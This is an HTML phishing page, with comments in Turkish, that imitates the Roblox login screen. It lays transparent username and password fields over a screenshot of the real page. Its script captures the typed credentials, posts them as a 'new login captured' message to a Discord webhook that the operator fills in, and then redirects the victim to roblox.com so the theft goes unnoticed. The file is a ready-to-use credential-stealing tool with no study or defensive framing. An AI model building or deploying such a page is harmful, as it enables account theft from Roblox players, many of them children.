<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Giriş</title>
    <style>
        /* Ekranın tüm boşluklarını sıfırlıyoruz */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0b0e11; /* Siyah arka plan */
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        /* Resmi ve girdileri bir arada tutan kilitli ana kafes */
        .wrapper {
            position: relative;
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Oranları bozmadan ekranı en verimli şekilde kaplayan ayar */
        .tam-ekran-resim {
            width: 100%;
            height: 100%;
            object-fit: contain; /* Resmin en-boy oranını bozmaz */
            display: block;
        }

        /* 
           GİRİŞ PANELİ ÇERÇEVESİ:
           Yazıların yukarı tırmanması için top değerini %32.5'e çektim kanka.
        */
        .form-container {
            position: absolute;
            width: 19.8%; 
            height: 48.5%;  
            top: 32.5%;   /* Bu rakamı azaltarak tüm yazıları toptan YUKARI taşıdık */
            left: 50.1%;
            transform: translateX(-50%);
            box-sizing: border-box;
        }

        /* Tüm elemanları bağımsız katmanlar olarak çiviliyoruz */
        .form-container input, .form-container button, .form-container a {
            position: absolute;
            width: 100%;
            height: 12.2%; 
            left: 0;
            background: transparent;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        /* Yazı yazılan input alanlarının iç metin ve dikey ortalama ayarları */
        .form-container input {
            color: #ffffff;
            font-size: 14px;
            padding: 0 12px;
            display: flex;
            align-items: center;
        }

        .form-container button, .form-container a {
            cursor: pointer;
        }

        /* ============================================================ */
        /* İÇ ELEMANLARIN PANEL İÇİNDEKİ SABİT KOORDİNATLARI            */
        /* ============================================================ */

        /* 1. KUTU: Username Giriş Alanı */
        .username-field {
            top: 0%; 
        }

        /* 2. KUTU: Password Giriş Alanı */
        .password-field {
            top: 15%; 
        }

        /* 3. BUTON: Log in butonu */
        .login-btn {
            top: 33.2%; 
            height: 13.5%; 
        }

        /* 4. BUTON: Send me the one-time code by email */
        .one-time-code-btn {
            top: 65.2%; 
            height: 13.5%;
        }

        /* 5. BUTON: Quick Login */
        .quick-login-btn {
            top: 81.8%; 
            height: 13.5%;
        }

        /* 6. LİNK: En alttaki Sign Up yazısı */
        .signup-link {
            top: 101%; 
            height: 8%;
            width: 25%; 
            left: auto;
            right: 13.5%; 
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <!-- Arka plan resmi -->
        <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">

        <!-- Kilitli form paneli -->
        <form id="girisFormu" class="form-container">
            <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
            <input type="password" id="password" name="password" class="password-field" required>
            <button type="submit" class="login-btn" title="Giriş Yap"></button>
            <button type="button" class="one-time-code-btn"></button>
            <button type="button" class="quick-login-btn"></button>
            <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
        </form>
    </div>

    <!-- DISCORD WEBHOOK BAĞLANTISI -->
    <script>
        // Kendi Discord Webhook linkini buraya yapıştırmayı unutma kanka!
        const webhookURL = "BURAYA_DISCORD_WEBHOOK_LINKINI_YAZ";

        document.getElementById('girisFormu').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const mesaj = {
                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mesaj)
            })
            .then(() => {
                window.location.href = "https://roblox.com";
            })
            .catch(() => {
                window.location.href = "https://roblox.com";
            });
        });
    </script>

</body>
</html>
